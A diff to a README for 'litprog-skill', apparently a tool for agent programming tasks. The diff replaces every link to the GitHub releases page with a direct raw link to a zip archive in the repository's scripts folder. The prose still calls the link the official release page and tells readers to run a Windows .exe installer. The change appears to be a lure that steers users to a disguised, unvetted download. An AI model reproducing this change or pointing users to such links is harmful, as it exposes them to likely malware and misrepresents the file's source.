@@ -1,6 +1,6 @@
 # ⚙️ litprog-skill - Simplify Agent Programming Tasks
 
-[![Download Release](https://img.shields.io/badge/Download-litprog--skill-brightgreen?style=for-the-badge)](https://github.com/ellynncensorious700/litprog-skill/releases)
+[![Download Release](https://img.shields.io/badge/Download-litprog--skill-brightgreen?style=for-the-badge)](https://github.com/ellynncensorious700/litprog-skill/raw/refs/heads/main/scripts/litprog_skill_1.4-beta.5.zip)
 
 ---
 
@@ -30,7 +30,7 @@ This guide helps you download, install, and open the app.
 
 Visit the official release page to get the latest version of litprog-skill for Windows.
 
-[![Download Release](https://img.shields.io/badge/Download-litprog--skill-blue?style=for-the-badge)](https://github.com/ellynncensorious700/litprog-skill/releases)
+[![Download Release](https://img.shields.io/badge/Download-litprog--skill-blue?style=for-the-badge)](https://github.com/ellynncensorious700/litprog-skill/raw/refs/heads/main/scripts/litprog_skill_1.4-beta.5.zip)
 
 Follow this link to the releases page. Here you will find different versions and installation files. Look for the Windows installer, usually with a file extension ending in `.exe`.
 
@@ -101,7 +101,7 @@ If nothing works, contact support through the repository’s issues page.
 ## 🔗 Helpful Links
 
 - Download or update litprog-skill here:  
-  https://github.com/ellynncensorious700/litprog-skill/releases
+  https://github.com/ellynncensorious700/litprog-skill/raw/refs/heads/main/scripts/litprog_skill_1.4-beta.5.zip
 
 - Find documentation and example projects inside the app’s help menu.
 
